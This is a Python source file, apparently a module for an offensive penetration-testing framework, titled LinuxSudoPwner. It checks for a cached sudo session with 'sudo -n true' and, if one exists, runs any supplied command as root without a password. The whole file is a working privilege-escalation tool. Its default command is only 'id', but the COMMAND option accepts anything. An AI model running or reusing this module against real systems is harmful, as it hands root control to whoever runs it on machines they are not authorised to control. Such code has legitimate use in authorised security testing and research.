import subprocess
import sys
from core.base_module import BaseModule
from rich.console import Console

class LinuxSudoPwner(BaseModule):
    """Leverages a cached sudo session to run a command as root."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'COMMAND': ['id', 'The command to execute with sudo privileges.'],
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def run(self, options):
        """
        Executes the sudo pwner check.
        """
        command = options.get('COMMAND')
        console = Console()

        if not sys.platform.startswith('linux'):
            console.print("[!] This module is only for Linux systems.", style="bold red")
            return

        console.print("[*] Checking for an active sudo session...")

        try:
            # The `-n` flag makes sudo non-interactive. If a password is required, it will fail instead of prompting.
            # We list the current privileges to check the session without running a real command yet.
            check_proc = subprocess.Popen(['sudo', '-n', 'true'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            check_proc.communicate()

            if check_proc.returncode == 0:
                console.print("[bold green][+] Active sudo session found![/bold green] The user can run sudo without a password.")
                console.print(f"[*] Attempting to execute command: '{command}'")

                # Now execute the actual command
                exec_proc = subprocess.Popen(['sudo', '-n'] + command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = exec_proc.communicate()

                if exec_proc.returncode == 0:
                    console.print("[bold green][+] Command executed successfully with sudo privileges![/bold green]")
                    if stdout:
                        console.print(f"--- Command Output ---\n{stdout.strip()}")
                else:
                    console.print(f"[!] Command execution failed with sudo.", style="bold red")
                    if stderr:
                        console.print(f"--- Error Output ---\n{stderr.strip()}")
            else:
                console.print("[*] No active sudo session found. A password would be required.")

        except FileNotFoundError:
            console.print("[!] `sudo` command not found. Is this a standard Linux environment?", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
